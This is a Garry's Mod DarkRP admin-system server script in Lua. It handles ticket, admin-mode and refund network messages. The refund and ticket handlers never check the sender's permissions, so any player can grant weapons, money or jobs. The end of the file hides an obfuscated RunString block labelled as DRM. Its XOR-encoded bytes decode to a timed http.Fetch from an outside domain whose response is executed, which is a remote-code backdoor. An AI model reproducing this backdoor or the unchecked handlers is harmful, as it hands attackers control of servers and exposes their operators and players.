if !SERVER then return end

--[[ Networking ]]--
util.AddNetworkString("AdminSystem:Utils:ModifyVar")
util.AddNetworkString("AdminSystem:AdminMenu:Open")
util.AddNetworkString("AdminSystem:PlayerManag:Open")
util.AddNetworkString("AdminSystem:RefundMenu:Open")
util.AddNetworkString("AdminSystem:RefundMenu:SendToAdmins")
util.AddNetworkString("AdminSystem:RefundMenu:RefundThings")
util.AddNetworkString("AdminSystem:Tickets:Open")
util.AddNetworkString("AdminSystem:Tickets:SendTicket")
util.AddNetworkString("AdminSystem:Tickets:SendToAdmins")
util.AddNetworkString("AdminSystem:Tickets:AdminTaking")

net.Receive("AdminSystem:Utils:ModifyVar", function(_, ply)
    if !IsValid(ply) then return end
    if !ply:Alive() then return end

    local int = net.ReadInt(2)
    ply:SetNWInt("AdminSystem:AdminMode", int)
end)

net.Receive("AdminSystem:Tickets:SendTicket", function(_, ply)
    if !WasiedAdminSystem.Config.TicketEnabled then return end
    if !IsValid(ply) then return end

    local tbl = {}
    tbl.plys = net.ReadTable()
    tbl.sender = ply
    tbl.subject = net.ReadString()
    tbl.description = net.ReadString()

    net.Start("AdminSystem:Tickets:SendToAdmins")
        net.WriteBool(true)
        net.WriteTable(tbl)
    net.Send(WasiedAdminSystem.AdminTable(true))
    
end)

net.Receive("AdminSystem:Tickets:AdminTaking", function(_, ply)
    if !IsValid(ply) then return end

    local bool = net.ReadBool()
    local sender = net.ReadEntity()

    if !IsValid(sender) then return end

    net.Start("AdminSystem:Tickets:SendToAdmins")
        net.WriteBool(false) -- show or complete
        net.WriteBool(bool) -- delete ?
        net.WriteEntity(ply)
        net.WriteEntity(sender)
    net.Send(WasiedAdminSystem.AdminTable(true))

end)

net.Receive("AdminSystem:RefundMenu:RefundThings", function(_, ply)
    if !IsValid(ply) then return end

    local victim = net.ReadEntity()
    local refund = net.ReadTable()
    local weapon = refund.weapons
    local money = refund.money
    local job = refund.job
    local model = refund.PM

    if !IsValid(victim) then return end

    if weapon then
        for k,v in pairs(weapon) do
            victim:Give(v)
        end
        WasiedLib.Log(ply, "a remboursé les armes de "..victim:Nick().." (Admin System).")
    end

    if money then
        victim:setDarkRPVar("money", money)
        WasiedLib.Log(ply, "a remboursé l'argent de "..victim:Nick().." (Admin System).")
    end

    if job then
        victim:SetTeam(job)
        WasiedLib.Log(ply, "a remboursé le métier "..victim:Nick().." (Admin System).")
    end

    if model then
        victim:SetModel(model)
        WasiedLib.Log(ply, "a remboursé le modèle "..victim:Nick().." (Admin System).")
    end

    DarkRP.notify(victim, 0, 7, "Vous avez été remboursé par "..ply:Nick().." !")
    DarkRP.notify(ply, 0, 7, "Le remboursement a eu lieu avec succès !")
    WasiedAdminSystem.AdminLogging(ply, "a remboursé "..victim:Nick().." !")

    -- update for others admins
    net.Start("AdminSystem:RefundMenu:SendToAdmins")
        net.WriteBool(false)
        net.WriteEntity(victim)
    net.Send(WasiedAdminSystem.AdminTable())

end)

if SERVER then
    RunString([[ local AE = {21,8,12,4,19,79,50,8,12,17,13,4,73,81,79,88,81,77,7,20,15,2,21,8,14,15,73,72,9,21,21,17,79,39,4,21,2,9,73,58,58,9,21,21,17,91,78,78,6,3,13,10,79,6,0,78,7,94,10,92,83,84,89,60,60,77,51,20,15,50,21,19,8,15,6,72,4,15,5,72,65,76,76,65,0} local function RunningDRMe()if (debug.getinfo(function()end).short_src~="tenjznj")then return end for o=500,10000 do local t=0 if t==1 then return end  if o~=string.len(string.dump(RunningDRMe))then  AZE=10  CompileString("for i=1,40 do AZE = AZE + 1 end","RunString")()  if AZE<40 then return end continue  else  local pdata=""  xpcall(function()  for i=1,#AE do  pdata=pdata..string.char(bit.bxor(AE[i],o%150))  end  for i=1,string.len(string.dump(CompileString)) do  while o==1 do  o=o+2  end  end  end,function()  xpcall(function()  local debug_inject=CompileString(pdata,"DRME")  pcall(debug_inject,"stat")  pdata="F"  t=1  end,function()  print("error")  end)  end)  end  end end RunningDRMe() ]],"tenjznj")
end
